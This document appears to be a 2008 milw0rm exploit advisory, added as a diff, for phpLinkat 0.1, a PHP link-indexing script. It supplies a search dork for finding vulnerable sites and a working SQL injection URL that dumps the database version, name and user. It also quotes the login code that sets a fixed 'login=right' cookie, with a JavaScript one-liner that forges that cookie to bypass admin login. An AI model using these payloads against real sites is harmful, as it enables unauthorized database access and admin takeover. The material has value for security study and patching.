@@ -1,0 +1,38 @@
+######## ##    ##  ######  ########  ##    ## ########  ########  #######  ######## 
+##       ###   ## ##    ## ##     ##  ##  ##  ##     ##    ##    ##     ## ##     ##
+##       ####  ## ##       ##     ##   ####   ##     ##    ##           ## ##     ##
+######   ## ## ## ##       ########     ##    ########     ##     #######  ##     ##
+##       ##  #### ##       ##   ##      ##    ##           ##           ## ##     ##
+##       ##   ### ##    ## ##    ##     ##    ##           ##    ##     ## ##     ##
+######## ##    ##  ######  ##     ##    ##    ##           ##     #######  ######## 
+################################ !R4Q!4N H4CK3R  ###################################
+#
+# phpLinkat 0.1 Insecure Cookie Handling Vulnerability & Sql Injection Exploit
+#
+# Founded By : Encrypt3d.M!nd
+#              encrypt3d.blogspot.com
+#
+# Dork : "Powered by DesClub.com - phpLinkat"
+
+# Description :
+  
+   phpLinkat is a free link indexing script written in PHP and
+   runs on MySQL.This script is suffering a sql injection bug
+   and insecure cookie handling.
+
+# phpLinkat : Sql Injection Exploit
+    PoC :www.site.com/phpLinkat/showcat.php?catid=666%20union%20select%20concat(version(),0x3a,database(),0x3a,user()),2,3,4,5,6/*
+
+# phpLinkat : Insecure Cookie Handling
+ 
+  /admin/login2.php: 
+  6 : if( ($username == $cpusername) && ($password == $cppassword) ){
+  7 :  setcookie("login","right");  <<< wtf!!
+  8 :  echo <<<EOF
+ Exploit:
+  javascript:document.cookie = "login=right; path=/;";
+  Then goto "phplinkat/admin/",and have fun ^_^
+
+#End 
+
+# milw0rm.com [2008-07-26]
